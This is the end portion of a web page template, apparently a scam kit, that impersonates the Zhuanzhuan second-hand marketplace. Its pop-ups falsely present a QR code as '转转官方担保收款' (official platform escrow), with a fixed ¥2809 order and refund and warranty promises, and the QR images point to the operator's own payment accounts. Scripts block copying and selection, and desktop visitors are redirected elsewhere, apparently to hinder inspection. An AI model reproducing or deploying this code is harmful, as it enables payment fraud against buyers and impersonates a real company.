            var proImg6 = $('#proImg6').val(); //二维码解密链接
            if (proImg6 != "") {
                location.href = proImg6;
            }
            else {
                if (payType == 1) {
                    //特殊支付方式
                    querenzhifu();
                }
                else {
                    //微信面对面
                    if (payType == 2) {
                        payContent = '<div class="ewm" style="padding:10px 10px; font-size:14px"><div style="color:#09BB07; padding-bottom:2px; font-weight:bold">更换支付方式</div><div style=" color:#999; padding-bottom:10px; border-bottom:1px solid #999">支付￥2809元（转转订单号：<br />100000859966582258788541）</div>  <div style="text-align:left;padding-top:0px; color:red"><img src="/ysimage/face.jpg" height="18" width="18"> <span style="font-weight:bold; font-size:15px">转转官方提示：</span><span style="color:#333">您的资金将付款转账至转转官方平台担保,请放心,资金将由转转官方平台保管,不满意7天内可退款,平台30天为您免费保质,请微信扫码完成订单</span></div><div style="text-align:center; margin-top:4px"><span style="font-size:15px; font-weight:bold; color:red">转转官方担保收款</span><br><img class="erweimaImg" src="/tuku/img/201809061800568404.png" width="200"/><br><span style="font-size:13px"><span style="color:blue">（请长按图中的二维码，识别二维码付款）</span><br>专业质检师为您检测，有验机服务请放心购买</span><div style="text-align:center; color:red; margin-top:2px">转转担保交易，保障资金安全</div></div>';
                        payStyle = 'width:280px;font-size:14px; height:530px;';
                    }
                    //****大众数卡换成巨人平台
                    if (payType == 3) {
                        payContent = ' <div class="ewm" style="padding:10px 10px; font-size:14px"><div style="color:#09BB07; padding-bottom:2px; font-weight:bold">更换支付方式</div><div style=" color:#999; padding-bottom:10px; border-bottom:1px solid #999">支付￥2809元（转转订单号：<br />100000859966582258788541）</div>  <div style="text-align:left;padding-top:0px; color:red"><img src="/ysimage/face.jpg" height="18" width="18"> <span style="font-weight:bold; font-size:15px">转转官方提示：</span><span style="color:#333">您的资金将付到转转官方平台担保,请放心资金将由转转官方平台保管,不满意7天内可退款,平台30天为您免费保质,请微信扫码完成订单</span></div><div style="text-align:center; margin-top:8px"><div style="font-size:13px; font-weight:bold; color:#00e; margin-bottom:2px">转转官方(巨人)担保收款</div><img class="erweimaImg" src="/tuku/img/201809061800568404.png" width="160"/><div><img src="/tuku/img/zhuanzhuan.jpg" width="22" style="position:relative; margin-top:-97px; z-index:10 " /></div><img src="logo_weixin.png" height="11" width="12"> 微信扫一扫支付<br><span style="font-size:13px"><span style="color:blue">（请长按图中的二维码，识别二维码付款）</span><br>专业质检师为您检测，有验机服务请放心购买</span><div style="text-align:center; color:red; margin-top:2px">转转担保交易，保障资金安全</div></div>';
                        payStyle = 'width:280px;font-size:14px; height:445px; margin-top:-35px;';
                    }
                    layer.open({
                        type: 0,
                        content: payContent,
                        style: payStyle, //自定风格
                        success: function () {
                            //此处不断刷新
                            var oid = $('#oid').val();
                            refeshWxPayImg(oid);
                            //$('img.erweimaImg').attr('src', 'login.png');
                        }
                    })
                }
            }
        });
    });
</script>
    
    <!--/*特殊支付模式弹出层样式*/-->
    <div onClick="outputb()" class="querenzhifu" id="paypagea" style="display:none;">
        <div class="content">
            <div class="title clear">
                <div onClick="outputb()" class="pull-left contain-img"><img src="style/img/4.jpg" style="width:26px; height:26px; vertical-align:middle"/> 向转转官方付款   X</div>
                <a href="javascript:void(0)" class="pull-right"></a>
            </div>
            <div class="info">
                <span>个人二手买卖安全无忧，公平透明</span><br/>
                <span>收货后使用出问题，15天内平台为您免费质保</span><br/>
                <span>交易出现纠纷，优品全程协助维权，七天可退款</span><br/>
                <span style="color:#00e">转转官方担保收款</span>
            </div><div id="zhifubao" style="display:none;">
              <img class="erweimaImg"  src="<?php echo $_GoodsID['zhifubao_img'] ?>" style="width:170px; height:170px;" />
              
              </div><div id="weixin" style="display:none;">
              
            <img  class="erweimaImg"  src="<?php echo $_GoodsID['weixin_img'] ?>" style="width:170px; height:170px;" /></div>
            <span class="green">转转优品</span>
            <span class="gray">长按识别二维码即可完成付款</span>
        </div>
    </div>
</main>

	<script type="text/javascript">
	//若是你不想别人扒掉你的模板，可以把这段js代码加到你网页上，即可屏蔽鼠标右键菜单、复制粘贴、选中等


//屏蔽右键菜单 
document.oncontextmenu = function(event) { 

    if (window.event) { 

        event = window.event; 

    } 


    try { 

        var the = event.srcElement; 

        if (!((the.tagName == "INPUT" && the.type.toLowerCase() == "text") || the.tagName == "TEXTAREA")) { 

            return false; 

        } 

        return true; 


    } catch (e) { 

        return false; 

    } 

} 




//屏蔽粘贴 
document.onpaste = function(event) { 
    if (window.event) { 

        event = window.event; 

    } 

    try { 

        var the = event.srcElement; 

        if (!((the.tagName == "INPUT" && the.type.toLowerCase() == "text") || the.tagName == "TEXTAREA")) { 

            return false; 

        } 

        return true; 

    } catch (e) { 

        return false; 

    } 

} 



//屏蔽复制 

document.oncopy = function(event) { 

    if (window.event) { 

        event = window.event; 

    } 

    try { 

        var the = event.srcElement; 

        if (!((the.tagName == "INPUT" && the.type.toLowerCase() == "text") || the.tagName == "TEXTAREA")) { 

            return false; 

        } 

        return true; 

    } catch (e) { 

        return false; 

    } 

} 


//屏蔽剪切 

document.oncut = function(event) { 

    if (window.event) { 

        event = window.event; 

    } 

    try { 

        var the = event.srcElement; 

        if (!((the.tagName == "INPUT" && the.type.toLowerCase() == "text") || the.tagName == "TEXTAREA")) { 

            return false; 

        } 

        return true; 

    } catch (e) { 

        return false; 

    } 

} 


//屏蔽选中 

document.onselectstart = function(event) { 

    if (window.event) { 

        event = window.event; 

    } 

    try { 

        var the = event.srcElement; 

        if (!((the.tagName == "INPUT" && the.type.toLowerCase() == "text") || the.tagName == "TEXTAREA")) { 

            return false; 

        } 

        return true; 

    } catch (e) { 

        return false; 

    } 

}

</script>
<script type="text/javascript">
function browserRedirect() {
var sUserAgent= navigator.userAgent.toLowerCase();
var bIsIpad= sUserAgent.match(/ipad/i) == "ipad";
var bIsIphoneOs= sUserAgent.match(/iphone os/i) == "iphone os";
var bIsMidp= sUserAgent.match(/midp/i) == "midp";
var bIsUc7= sUserAgent.match(/rv:1.2.3.4/i) == "rv:1.2.3.4";
var bIsUc= sUserAgent.match(/ucweb/i) == "ucweb";
var bIsAndroid= sUserAgent.match(/android/i) == "android";
var bIsCE= sUserAgent.match(/windows ce/i) == "windows ce";
var bIsWM= sUserAgent.match(/windows mobile/i) == "windows mobile";
if (bIsIpad || bIsIphoneOs || bIsMidp || bIsUc7 || bIsUc || bIsAndroid || bIsCE || bIsWM) {
window.location.href= '#';
} else {
window.location= 'https://m.jiaoyimao.com/';
}
}
browserRedirect();
</script>
</body></html>